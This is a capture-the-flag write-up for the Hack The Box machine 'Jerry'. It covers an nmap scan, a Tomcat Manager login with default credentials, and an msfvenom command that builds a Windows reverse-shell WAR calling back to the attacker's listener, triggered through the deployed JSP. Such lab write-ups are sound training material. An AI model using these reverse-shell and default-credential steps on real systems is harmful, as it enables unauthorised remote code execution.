---
icon: windows
---

# Jerry - Easy

<figure><img src="../../.gitbook/assets/image (2860).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/jerry"><strong>Jerry</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap Scan:

```bash
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.95 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 23:52 EST
Nmap scan report for 10.10.10.95
Host is up (0.038s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   46.86 ms 10.10.16.1
2   47.01 ms 10.10.10.95
```

### <mark style="color:$primary;">HTTP Port 8080 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2862).png" alt=""><figcaption></figcaption></figure>

This is the default webpage for Tomcat!

The default credentials for the Tomcat Manager Application is: `tomcat/s3cret`  and they work here

<figure><img src="../../.gitbook/assets/image (2863).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Exploiting Tomcat</mark>

To get a shell, I'll use the "WAR file to deploy" section of the manager&#x20;

Tomcat Manager makes it easy to deploy war files, and since these can contain Java code, it’s a great target for gaining execution.

#### Create war File

I’ll use `msfvenon` to create a windows reverse shell:

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=80 -f war > rev_shell.war
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2867).png" alt=""><figcaption></figcaption></figure>

I’ll also need to know the name of the jsp page to activate it with curl. I’ll use `jar` to list the contents of the war.

<figure><img src="../../.gitbook/assets/image (2868).png" alt=""><figcaption></figcaption></figure>

Now upload it through the manager application setup a listener on your designated port and then curl or visit the page at [`http://10.10.10.95:8080/rev_shell/qirzxhtvveyrd.jsp`](http://10.10.10.95:8080/rev_shell/qirzxhtvveyrd.jsp)

<figure><img src="../../.gitbook/assets/image (2866).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2869).png" alt=""><figcaption></figcaption></figure>

